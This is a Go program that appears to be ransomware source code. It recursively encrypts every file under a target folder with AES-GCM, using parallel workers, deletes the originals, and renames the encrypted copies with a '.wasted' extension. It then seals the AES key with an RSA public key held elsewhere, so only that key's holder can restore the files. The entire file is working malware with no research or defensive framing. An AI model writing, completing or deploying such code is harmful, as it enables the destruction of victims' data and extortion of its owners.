package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"sync"
)

func scandirs(path string) ([]string, []string) {
	var outputdir []string
	var files []string

	var walkn func(p string)
	walkn = func(p string) {
		entries, err := os.ReadDir(p)
		if err != nil {
			log.Printf("Failed to read directory %s: %v", p, err)
			return
		}
		for _, entry := range entries {
			fullPath := filepath.Join(p, entry.Name())
			if entry.IsDir() {
				outputdir = append(outputdir, fullPath)
				walkn(fullPath)
			} else {
				files = append(files, fullPath)
			}
		}
	}
	walkn(path)
	return outputdir, files
}

func openfile(path string) []byte {
	text, err := os.ReadFile(path)
	if err != nil {
		log.Fatal("err reading file", path)
	}
	return text
}

func encryptFile(file string, key []byte) error {
	cipherb, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(cipherb)

	text := openfile(file)

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("error crafting the nonce \n", err)
	}

	ciphertext := gcm.Seal(nil, nonce, text, nil)
	ciphertext = append(nonce, ciphertext...)

	err := os.Remove(file)
	if err != nil {
		return fmt.Errorf("couldnt suppress file: ", file)
	}

	if err := os.WriteFile(file+".wasted", ciphertext, 0644); err != nil {
		return fmt.Errorf("error writing to file\n", err)
	}

	os.Remove(file)
	return nil
}

func encrypt_files(files []string, key []byte) error {
	for _, v := range files {
		err := encryptFile(v, key)
		fmt.Print("encrypting: ", v, " ...\n")
		if err != nil {
			return fmt.Errorf("couldn't encrypt file on", v, "\n", "err: ", err)
		}
	}
	return nil
}

func generate_key(n int) []byte {
	k := make([]byte, n)
	rand.Read(k)
	return k
}

func encrypt_key(content []byte, publicKey rsa.PublicKey) {
	encryptedBytes, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		&publicKey,
		content,
		nil)
	if err != nil {
		fmt.Print(err)
	}

	err = os.WriteFile("/keys/key.txt", encryptedBytes, 0600)
	if err != nil {
		log.Fatal(err)
	}
}

func load_pub_key_to_mem(path string) (*rsa.PublicKey, error) {
	public_key_data, err := os.ReadFile(path)
	if err != nil {
		log.Fatal(err, "error in load key")
	}
	block, _ := pem.Decode(public_key_data)
	if block == nil {
		return nil, fmt.Errorf("couldn't resolve the blocker")
	}
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("couldnt parse the key block", err)
	}
	return pub, nil
}

type Job struct {
	filechunk []string
}

/* use runtime.NumCPU() and assign one proc per cpu */

func worker2(jobs <-chan Job, wg *sync.WaitGroup, key []byte) {
	defer wg.Done()
	for job := range jobs {
		err := encrypt_files(job.filechunk, key)
		if err != nil {
			log.Fatal(err)
		}
	}
}

func main() {

	KEY := generate_key(32)
	way := "path/to/your/folder"
	_, file := scandirs(way)
	numworker := runtime.NumCPU()
	chunk := (len(file) + numworker - 1) / numworker
	jobs := make(chan Job, numworker)
	var wg sync.WaitGroup
	for i := 1; i <= numworker; i++ {
		wg.Add(1)
		go worker2(jobs, &wg, KEY)
	}

	for start := 0; start < len(file); start += chunk {
		end := start + chunk
		if end > len(file) {
			end = len(file)
		}
		jobs <- Job{filechunk: file[start:end]}
	}

	close(jobs)
	wg.Wait()
	pubKey, err := load_pub_key_to_mem("//keys/public.rsa.pub")
	if err != nil {
		log.Fatal(err)
	}
	if err != nil {
		log.Fatal(err)
	}
	encrypt_key(KEY, *pubKey)
}
